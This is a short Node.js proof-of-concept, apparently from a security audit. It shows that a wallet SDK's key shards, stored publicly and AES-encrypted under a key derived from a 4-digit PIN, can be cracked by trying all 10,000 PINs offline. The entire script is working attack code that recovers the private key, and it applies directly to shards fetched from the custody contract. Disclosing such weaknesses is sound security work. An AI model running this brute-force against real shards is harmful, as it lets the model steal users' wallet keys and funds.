const { ethers } = require("ethers");
const CryptoJS = require("crypto-js");

// === EXPLOIT 1: WEAK ENCRYPTION & PIN BRUTE-FORCE ===
// This script simulates the attack chain:
// 1. Attacker fetches public shard from contract.
// 2. Attacker bruteforces the 4-digit PIN used for AES.

async function run() {
    console.log("=== VULNERABILITY 2: PIN BRUTE-FORCE SIMULATION ===");
    console.log("Target: Verified SDK Encryption (AES + 4-Digit PIN)");

    // 1. Simulating the Victim (Encryption)
    // In reality, this data is fetched via 'getShards' from the Custody contract
    const realSecret = "0x" + require("crypto").randomBytes(32).toString("hex");
    const weakPin = Math.floor(Math.random() * 10000).toString().padStart(4, '0');

    console.log(`[VICTIM] Secret: ${realSecret}`);
    console.log(`[VICTIM] PIN:    ${weakPin} (The attacker ignores this)`);

    // SDK Encryption Logic (Replicated)
    const keyHex = ethers.utils.formatBytes32String(weakPin);
    const key = CryptoJS.enc.Hex.parse(keyHex.slice(2));
    const iv = CryptoJS.lib.WordArray.random(16);
    const encrypted = CryptoJS.AES.encrypt(realSecret, key, {
        iv: iv,
        mode: CryptoJS.mode.CBC,
        padding: CryptoJS.pad.Pkcs7
    });

    // The public shard string
    const shard = `0xID.${iv.toString(CryptoJS.enc.Base64)}.${encrypted.toString()}`;
    console.log(`[PUBLIC] Shard:  ${shard}`);

    // 2. The Attack (Decryption)
    console.log("\n[ATTACK] Starting offline brute-force...");
    const start = Date.now();

    for (let i = 0; i <= 9999; i++) {
        const candidate = i.toString().padStart(4, '0');

        try {
            const parts = shard.split('.');
            const iv_ = CryptoJS.enc.Base64.parse(parts[1]);
            const ct_ = CryptoJS.enc.Base64.parse(parts[2]);
            const k_ = CryptoJS.enc.Hex.parse(ethers.utils.formatBytes32String(candidate).slice(2));

            const decrypted = CryptoJS.AES.decrypt(
                { ciphertext: ct_ },
                k_,
                { iv: iv_, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }
            );

            const res = decrypted.toString(CryptoJS.enc.Utf8);
            if (res && res.startsWith("0x") && res.length === 66) {
                const duration = (Date.now() - start) / 1000;
                console.log(`\nPIN Found: [ ${candidate} ] in ${duration.toFixed(3)}s`);
                console.log(`Recovered Key: ${res}`);
                break;
            }
        } catch (e) { }
    }
}

run();
